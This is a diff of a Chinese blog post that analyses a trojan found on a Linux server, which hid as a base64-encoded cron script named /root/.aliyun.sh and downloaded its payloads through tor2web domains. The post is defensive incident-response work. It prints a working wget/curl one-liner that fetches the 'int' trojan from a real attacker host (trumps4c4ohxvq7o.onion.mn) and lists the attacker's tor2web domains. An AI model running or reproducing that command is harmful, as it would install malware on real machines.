@@ -18,7 +18,7 @@ categories:
 我想事情可能没那么简单，可能设置了定时任务或者有其他远控尚未发现。通过排查定时任务使用`crontab -l`，发现有一条定时任务，仔细一看原来是阿里云的shell脚本，但是整个系统就配置了这一条定时任务，难免让人怀疑。
 ![20191219-trojan-03.png](https://hksanduo.github.io/images/20191219-trojan-03.png)
 当我打开`/root/.aliyun.sh`，我突然发现自己还是太年轻，攻击者尽然使用的是障眼法，没有那个运维人员会闲的蛋疼，把shell程序的内容使用base64进行编码。
-![20191219-trojan-04.png](https://hksanduo.github.io/images/20191219-trojan-04.png)   
+![20191219-trojan-04.png](https://hksanduo.github.io/images/20191219-trojan-04.png)
 以下是相关代码，有想研究的小伙伴可以拿去进行研究。
 ```
 #!/bin/bash
@@ -91,13 +91,20 @@ fi
 * onion.nz
 * onion.glass
 * tor2web.su
-
-下载木马客户端的用户名为当前时间的md5值，然后授权执行删除。
+通过全网检这些三级域名，发现年中的时候有人中招了，文件名不同，但是手法很像，有兴趣可以查看我提供参考链接。下载木马客户端的用户名为当前时间的md5值，然后授权执行删除。
 具体使用wget或者curl请求下载int木马文件拼接案例语句如下：
 ```
 wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee4ac14e82501dc127890f75770c17   || curl -m10 -fsSLkA- trumps4c4ohxvq7o.onion.mn/int -o./e0ee4ac14e82501dc127890f75770c17
 ```
-然后继续通过判断 **/proc/木马进程id/io** 文件是否存在，如果不存在执行**U**函数从以下这些站点三级域名**trumps4c4ohxvq7o**下载**crn** shell脚本并执行，
+将下载下来的int和crn文件进行分析，
+virustotal返回的结果是crn是安全的，int只有Ikarus和SentinelOne (Static ML)两个引擎判断为木马，可见这个木马病毒在绕过引擎检测方面下了大量功夫。
+![20191219-trojan-17.png](https://hksanduo.github.io/images/20191219-trojan-17.png)
+![20191219-trojan-18.png](https://hksanduo.github.io/images/20191219-trojan-18.png)
+返现int木马程序主体，crn为shell文件，目的是下载int木马程序并运行，crn文件并未进行编码和混淆，不太清楚作者为何这么做。
+![20191219-trojan-19.png](https://hksanduo.github.io/images/20191219-trojan-19.png)
+将int扔到IDA并未发现什么，只发现基本的逻辑流程，可能个人逆向功底太弱了，那位大佬分析了，可以请教一下。
+![20191219-trojan-20.png](https://hksanduo.github.io/images/20191219-trojan-20.png)
+接下来我们继续分析aliyun.sh脚本，发现木马通过判断 **/proc/木马进程id/io** 文件是否存在，如果不存在执行**U**函数从以下这些站点三级域名**trumps4c4ohxvq7o**下载**crn** shell脚本并执行，
 使用`lsof`命令查看该进程相关信息，如果没有相关命令，请自行安装
 ![20191219-trojan-07.png](https://hksanduo.github.io/images/20191219-trojan-07.png)
 可以发现相应的远控客户端（/usr/bin/46e5166a46208402e09732a78526b5f0）已删除
@@ -130,5 +137,4 @@ wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee
 ## 参考内容
 * [http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html](http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html)【/tmp/.X11-unix=是什么玩意】
 * [https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix](https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix) 【what-is-tmp-x11-unix】
-* [https://dwheeler.com/flawfinder/](https://dwheeler.com/flawfinder/)【flawfinder官网】
-* [https://github.com/david-a-wheeler/flawfinder](https://github.com/david-a-wheeler/flawfinder)【github】
+* [https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html](https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html)
